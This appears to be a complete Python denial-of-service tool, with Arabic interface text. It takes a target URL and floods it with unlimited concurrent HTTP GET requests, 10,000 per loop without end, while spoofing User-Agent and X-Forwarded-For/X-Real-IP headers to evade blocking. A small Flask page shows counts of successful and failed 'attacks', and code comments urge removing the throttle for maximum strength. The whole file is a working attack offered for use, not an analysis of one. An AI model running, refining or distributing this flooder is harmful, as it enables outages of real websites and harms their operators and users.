import requests
from flask import Flask, render_template_string
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import random
from user_agent import generate_user_agent
import asyncio
import aiohttp

a1 = '\x1b[1;31m'  # Red
a3 = '\x1b[1;32m'  # Green
a20 = '\x1b[38;5;226m' # Yellow-orange
a22 = '\x1b[38;5;216m'  # Light orange

app = Flask(__name__)
Almunharif_port_001 = 4000
Almunharif_url_002 = input(f'{a20}URL : ')
print()
print(f'{a3}قم باخذ رابط الخادم وفتحه بلمتصفح لمعرفة الاحصائيات')
print()

Almunharif_success_count_003 = 0
Almunharif_failure_count_004 = 0
lock = threading.Lock()  

def Almunharif_generate_random_ip_005():
    """Generates a random IP address."""
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

async def Almunharif_send_request_async_006(session, retries=3, delay=0.1):
    """Sends an asynchronous request with retries."""
    global Almunharif_success_count_003, Almunharif_failure_count_004
    Almunharif_user_agent_007 = generate_user_agent()
    Almunharif_random_ip_008 = Almunharif_generate_random_ip_005()

    Almunharif_headers_009 = {
        "User-Agent": Almunharif_user_agent_007,
        "X-Forwarded-For": Almunharif_random_ip_008,
        "X-Real-IP": Almunharif_random_ip_008
    }

    for _ in range(retries):
        try:
            async with session.get(Almunharif_url_002, headers=Almunharif_headers_009, timeout=5) as response:
                if response.status == 200:
                    with lock:
                        Almunharif_success_count_003 += 1
                    return
        except aiohttp.ClientError:
            await asyncio.sleep(delay)
    with lock:
        Almunharif_failure_count_004 += 1

async def Almunharif_start_massive_attack_async_012():
    """Starts the asynchronous massive attack."""
    # Increased concurrency for aiohttp
    connector = aiohttp.TCPConnector(limit_per_host=0, limit=0) # No limits, rely on system resources
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            try:
                # Create many tasks to run concurrently
                tasks = [Almunharif_send_request_async_006(session) for _ in range(10000)] # Increased per-loop requests
                await asyncio.gather(*tasks)
            except Exception as e:
                print(f"{a1}خطأ: {e}")
            # Consider a small sleep to avoid overwhelming the local machine,
            # but for maximum "strength", you might remove this.
            # await asyncio.sleep(0.01) # Small delay to prevent CPU exhaustion

@app.route('/')
def Almunharif_index_016():
    """Renders the attack statistics page."""
    return render_template_string('''
        <html>
            <head>
                <title>إحصائيات الهجمات</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        text-align: center;
                        background-color: #1a1a2e;
                        color: #e94560;
                        margin: 0;
                        padding: 0;
                    }
                    h1 {
                        margin-top: 50px;
                        font-size: 36px;
                    }
                    p {
                        font-size: 20px;
                        margin: 10px 0;
                    }
                    .stats {
                        margin-top: 30px;
                        padding: 20px;
                        background: #0f3460;
                        border-radius: 10px;
                        display: inline-block;
                        box-shadow: 0 0 10px #e94560;
                    }
                </style>
            </head>
            <body>
                <h1>إحصائيات الهجمات</h1>
                <div class="stats">
                    <p><strong>الهجمات الناجحة:</strong> {{ Almunharif_success_count_003 }}</p>
                    <p><strong>الهجمات الفاشلة:</strong> {{ Almunharif_failure_count_004 }}</p>
                </div>
            </body>
        </html>
    ''', Almunharif_success_count_003=Almunharif_success_count_003, Almunharif_failure_count_004=Almunharif_failure_count_004)

def run_flask():
    """Runs the Flask app."""
    app.run(port=Almunharif_port_001)

if __name__ == '__main__':
    # Start the Flask app in a separate thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Run the asynchronous attack
    asyncio.run(Almunharif_start_massive_attack_async_012())

